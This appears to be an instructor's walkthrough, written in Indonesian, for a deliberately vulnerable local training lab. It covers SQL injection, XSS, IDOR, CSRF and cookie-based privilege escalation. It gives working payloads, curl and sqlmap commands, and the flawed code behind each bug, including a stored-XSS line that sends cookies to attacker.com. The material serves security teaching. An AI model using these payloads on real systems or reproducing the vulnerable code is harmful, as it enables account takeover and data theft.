# 🛡️ ACT LAB: NATIONAL SEMINAR EXPLOITATION BIBLE
> **SECRET INSTRUCTOR DOCUMENT - DO NOT DISTRIBUTE TO PARTICIPANTS**

Dokumen ini berisi panduan teknis untuk demonstrasi live-exploitation. Fokus pada penggunaan tools Linux (cURL, SQLmap) dan pemahaman akar masalah (Root Cause) pada kode.

---

## 1. SQL Injection: Authentication Bypass
**Target:** `/labs/sqli-login`  
**Goal:** Login sebagai Admin tanpa password.

### 🛠️ Manual Way
1. Buka halaman login.
2. Masukkan username: `admin`
3. Masukkan password: `' OR '1'='1`
4. Klik **Execute Exploit**.

### 🤖 Automated (cURL)
```bash
curl -X POST http://localhost:3000/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin", "password":"'\'' OR '\''1'\''='\''1"}'
```

### 🔍 Vulnerable Code (`api/auth.js`)
```javascript
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
// MASALAH: Variabel password langsung disisipkan ke string query tanpa sanitasi.
```

### ⚠️ Impact
Attacker dapat masuk ke akun siapapun (termasuk admin) tanpa tahu kredensialnya. Ini adalah level kritikalitas tertinggi (A01:2021-Broken Access Control).

---

## 2. SQL Injection: UNION Extraction
**Target:** `/labs/sqli-union`  
**Goal:** Mencuri data dari tabel lain (leaking flags).

### 🛠️ Manual Way
1. Cari tahu jumlah kolom: `' UNION SELECT 1,2,3,4,5,6,7,8 --`
2. Tarik flag dari tabel challenges:
   `' UNION SELECT 1,flag,3,4,5,6,7,8 FROM challenges --`

### 🤖 Automated (SQLmap)
```bash
sqlmap -u "http://localhost:3000/api/search?q=test" --batch --dump -T challenges -C flag
```

### 🔍 Vulnerable Code (`api/search.js`)
```javascript
const query = `SELECT id, title, description, category, difficulty, hint, points, endpoint 
               FROM challenges WHERE title LIKE '%${q}%'`;
// MASALAH: Penggunaan LIKE dengan input user yang tidak di-escape memungkinkan penambahan perintah SQL (UNION).
```

### ⚠️ Impact
Pencurian database secara massal (PII Leakage). Data sensitif seperti password hash, email, dan token bisa dikuras.

---

## 3. Reflected XSS (Client-Side)
**Target:** `/labs/xss-reflected`  
**Goal:** Menjalankan script di browser korban.

### 🛠️ Manual Way
Masukkan payload ke input: `<script>alert(window.origin)</script>` atau `<img src=x onerror=alert(1)>`

### 🤖 Automated (URL-based)
```bash
# Kirim link ini ke korban
http://localhost:3000/labs/xss-reflected?q=<script>alert('XSS')</script>
```

### 🔍 Vulnerable Code (`xss-reflected.html`)
```javascript
target.innerHTML = q; 
// MASALAH: Menggunakan .innerHTML untuk merender input user tanpa filter/encoding.
```

### ⚠️ Impact
Pencurian Session Cookie (Session Hijacking), defacement halaman, atau redirect user ke situs phishing.

---

## 4. Stored XSS (Persistent)
**Target:** `/labs/xss-stored`  
**Goal:** Script tertanam di database dan menyerang setiap pengunjung.

### 🛠️ Manual Way
Posting pesan baru di Guestbook:
```html
<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
```

### 🔍 Vulnerable Code (`api/guestbook.js`)
```javascript
const query = `INSERT INTO guestbook_entries (author, message) VALUES ('${author}', '${message}')`;
// MASALAH: Data disimpan apa adanya ke DB, dan dirender mentah-mentah oleh frontend.
```

### ⚠️ Impact
Infeksi massal. Setiap user yang membuka halaman Guestbook akan menjalankan script attacker secara otomatis. Sangat berbahaya untuk worm/malware distribution.

---

## 5. Insecure Direct Object Reference (IDOR)
**Target:** `/labs/idor`  
**Goal:** Mengintip data user lain dengan manipulasi ID.

### 🛠️ Manual Way
1. Lihat URL: `/labs/idor?id=999`
2. Ubah angka di URL menjadi `1`: `/labs/idor?id=1`
3. Data Admin akan muncul (termasuk Flag di bio).

### 🤖 Automated (Bash Script)
```bash
for i in {1..10}; do curl -s "http://localhost:3000/api/profile?id=$i" | grep "bio"; done
```

### 🔍 Vulnerable Code (`api/profile.js`)
```javascript
const query = `SELECT * FROM users WHERE id=${id}`;
// MASALAH: Server percaya pada ID yang dikirim client tanpa mengecek apakah user tsb berhak melihat data tsb.
```

### ⚠️ Impact
Kebocoran data privasi. User biasa bisa melihat invoice, rekam medis, atau chat milik user lain.

---

## 6. Cross-Site Request Forgery (CSRF)
**Target:** `/labs/csrf`  
**Goal:** Mengubah email korban melalui situs pihak ketiga.

### 🛠️ Manual Way
Gunakan `Referer` bypass dengan domain yang mengandung kata kunci (Loose check).
1. Deploy file HTML nakal di domain `act-lab-csrf.evil.com`.
2. Klik link dari domain jahat tersebut.

### 🤖 Automated (cURL Bypass)
```bash
curl -X POST "http://localhost:3000/api/profile" \
     -H "Content-Type: application/json" \
     -H "Referer: http://act-lab-csrf.attacker.com" \
     -d '{"email":"hacker@actlab.pro"}'
```

### 🔍 Vulnerable Code (`api/profile.js`)
```javascript
const isAuthorized = referer.includes('act-lab-csrf-sqli.vercel.app');
// MASALAH: Menggunakan .includes() alih-alih pengecekan domain secara ketat.
```

### ⚠️ Impact
Akun Takeover. Attacker bisa mengubah email/password korban hanya dengan memancing korban mengklik sebuah link.

---

## 7. Privilege Escalation (Cookie Hacking)
**Target:** `/admin`  
**Goal:** Menjadi Admin secara instant.

### 🛠️ Manual Way
1. Buka F12 (Inspect Element) &rarr; Application &rarr; Cookies.
2. Tambahkan Cookie baru: `role=admin`
3. Refresh halaman. Navbar akan berubah jadi Pink &rarr; Klik **ADMIN PANEL**.

### 🔍 Vulnerable Code (`middleware/auth.js` & `admin.html`)
```javascript
const isAdmin = req.cookies.role === 'admin';
// MASALAH: Keamanan hanya bergantung pada Client-Side Cookie yang bisa diubah kapan saja oleh user.
```

### ⚠️ Impact
Bypass total seluruh sistem keamanan. User bisa menghapus database, mengubah skor, atau mematikan server.
